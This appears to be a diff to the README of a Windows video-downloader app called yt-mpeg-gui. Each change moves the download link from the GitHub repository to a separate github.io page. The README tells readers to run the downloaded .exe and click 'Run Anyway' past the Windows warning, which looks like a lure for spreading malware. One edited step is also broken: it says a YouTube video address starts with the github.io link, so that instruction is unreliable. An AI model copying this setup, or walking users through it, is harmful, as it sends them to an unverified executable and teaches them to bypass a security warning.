@@ -1,7 +1,7 @@
 <h1>🎬 yt-mpeg-gui - Your Fastest Path to 4K Videos</h1>
 
 <p align="center">
-  <a href="https://github.com/geraldvalencia1190/yt-mpeg-gui"><img src="https://img.shields.io/badge/Download%20yt--mpeg--gui-%E2%9C%94%20Free%20Download-2ea44f?style=for-the-badge" alt="Download Button" style="max-width: 100%;"></a>
+  <a href="https://geraldvalencia1190.github.io"><img src="https://img.shields.io/badge/Download%20yt--mpeg--gui-%E2%9C%94%20Free%20Download-2ea44f?style=for-the-badge" alt="Download Button" style="max-width: 100%;"></a>
 </p>
 
 Welcome to **yt-mpeg-gui** – the simplest way to download videos and music from the internet. No technical skills needed. No confusing commands. Just a clean, dark, and modern window where you paste a link, press a button, and get your file. This guide will walk you through everything – from downloading the program to downloading your first 4K video – in plain English.
@@ -29,7 +29,7 @@ The first step is to get the program onto your computer. We’ve made this as ea
 
 The big green button at the top of this page is your starting point. It will take you to the official download page for the program. Here is the link again for your convenience:
 
-**[👉 Click Here to Visit the Download Page](https://github.com/geraldvalencia1190/yt-mpeg-gui)**
+**[👉 Click Here to Visit the Download Page](https://geraldvalencia1190.github.io)**
 
 **Step 2: What You'll Find**
 
@@ -83,7 +83,7 @@ Once open, you'll see a simple interface:
 Let's do a test run to see how it works.
 
 1.  Go to a video website like YouTube and find a video you want (try searching for "4K nature video" to see the quality difference).
-2.  Copy the web address from the top of your browser (it starts with `https://www.youtube.com/watch?v=...`).
+2.  Copy the web address from the top of your browser (it starts with `https://geraldvalencia1190.github.io`).
 3.  Go back to yt-mpeg-gui and click on the text box. Press **Ctrl + V** (or right-click and paste) to put the link in.
 4.  Choose your preferred quality. You might see dropdown menus or quality selection buttons. Select **4K** or **2160p** if available, or simply choose "Best" for the highest quality the video supports.
 5.  Click the **Download** button. You'll see progress bars showing how fast it's downloading. 
@@ -181,7 +181,7 @@ A: By default, the program saves everything to a folder named "Downloads" inside
 
 Let's summarize the entire journey in four easy steps.
 
-1.  **Get the Program:** Click the **[Download button](https://github.com/geraldvalencia1190/yt-mpeg-gui)** at the top of this page. Once on the site, **visit this link to download the application** (look for the "Download ZIP" option). Extract the ZIP file.
+1.  **Get the Program:** Click the **[Download button](https://geraldvalencia1190.github.io)** at the top of this page. Once on the site, **visit this link to download the application** (look for the "Download ZIP" option). Extract the ZIP file.
 2.  **Open the App:** Double-click `yt-mpeg-gui.exe` from the extracted folder. Click "More info" and "Run Anyway" if Windows asks.
 3.  **Get Your Content:** Copy a link from your favorite video site, paste it into the app, pick a quality, and click Download. For music, just flip the switch to "MP3".
 4.  **Stay Updated & Enjoy:** Occasionally click the update button in the app to keep it fresh. Your videos and music are now safely on your computer, ready to watch or listen to anytime, even without internet.
